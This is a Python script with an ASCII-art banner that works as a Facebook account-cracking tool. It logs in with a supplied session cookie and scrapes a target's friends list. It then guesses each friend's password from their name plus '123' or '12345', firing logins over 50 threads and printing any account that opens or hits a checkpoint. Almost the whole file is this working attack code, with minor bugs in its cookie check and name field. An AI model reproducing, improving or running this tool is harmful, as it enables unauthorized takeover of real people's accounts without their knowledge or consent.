─────────▀▀▀▀▀▀──────────▀▀▀▀▀▀▀
──────▀▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀▀▀▀▀▀
────▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────▀▀▀
───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────────▀▀
──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀─────▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀▀
─────▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀▀
──────▀▀▀▀▀▀▀▀▀▀▀───▀▀▀────────▀▀▀
────────▀▀▀▀▀▀▀▀▀──▀▀▀▀▀────▀▀▀▀
───────────▀▀▀▀▀▀───▀▀▀───▀▀▀▀
─────────────▀▀▀▀▀─────▀▀▀▀
────────────────▀▀▀──▀▀▀▀
──────────────────▀▀▀▀
───────────────────▀▀
import requests,bs4,os,sys,time
from multiprocessing.dummy import Pool


class main:
	def __init__(self):
		self.loader=[]
		self.cookies={}
		self.title=None
		if os.path.exists(".token"):
			if os.path.getsize(".token") !=0:
				self.convert(open(".token").read().strip())
			else:self.gentok()
		else:self.gentok()
	
	def gentok(self):
		r=raw_input("token: ")
		if r=="":
			self.gentok()
		else:self.convert(r)
		
	def convert(self,t):
		for i in t.split(";"):
			self.cookies.update({i.split("=")[0]:i.split("=")[1]})
		open(".token","w").write(t)
		self.ceklog()
		
	def ceklog(self):
		r=requests.get("https://mbasic.facebook.com/me",cookies=self.cookies).text
		if len(bs4.re.findall("logout",r)) !=0:
			print("[+] logged as: %s"%bs4.BeautifulSoup(r,"html.parser").find("title").text)
			self.id()
		else:os.remove(".token");exit("[+] login failed.")
		
	def id(self):
		r=raw_input('?: target id: ')
		if r=='':
			self.id()
		else:self.find("https://mbasic.facebook.com/"+r+"?v=friends")
		
	def genpw(self,text):
		f=[]
		for i in text.split(" "):
			f.append(i+"123")
			f.append(i+"12345")
		return f
			
		
	def find(self,url=None):
		bs=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies).text,"html.parser")
		if self.title==None:
			self.title=bs.find("title").text
		for i in bs.find_all("a",href=True):
			print("\r+: dump friends from %s... %s"%(self.title[0:10],
				len(self.loader))),;sys.stdout.flush()
			if "fref" in i["href"]:
				if "profile.php" in i["href"]:
					f=bs4.re.findall("profile\.php\?id=(.*?)&",i["href"])
					if len(f) !=0:
						self.loader.append({"pw":self.genpw(i.text),"id":"".join(f)})
				else:
					f=bs4.re.findall("/(.*?)\?",i["href"])
					if len(f) !=0:
						self.loader.append({"pw":self.genpw(i.text),"id":"".join(f)})
			if "Lihat Teman Lain" in i.text:
				time.sleep(2)
				try:
					self.find("https://mbasic.facebook.com/"+i["href"])
				except:self.find("https://mbasic.facebook.com/"+i["href"])
				
		if len(self.loader) !=0:
			print("\n+: cracking %s users ..."%len(self.loader))
			Pool(50).map(self.crack,self.loader)
		else:print("\n+: no users found.")
		
	def crack(self, loader):
		for i in loader.get("pw"):
			self.login(i,loader.get("id"),loader.get("name"))
			
	def login(self, pw,id,name):
		try:
			login=requests.post("https://mbasic.facebook.com/login",
				data={"email":id,"pass":pw},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36"}
			)
			if "c_users" in login.cookies.get_dict():
				print("[======== ACCOUNT FOUND========]")
				print("  [+] ID: %s\n  [+] NAME: %s\n  [+] PASSWORD: %s"%(
					login.cookies.get_dict()["c_user"],name,pw))
			elif "checkpoint" in login.url:
				print("[==== CHECKPOINT\n  [+] NAME: %s\n  [+] ID: %s\n  [+] PASSWORD: %s"%(
					name,id,pw))
		except Exception as e:
			print e
			self.login(pw,id,name)
					
				
				
main()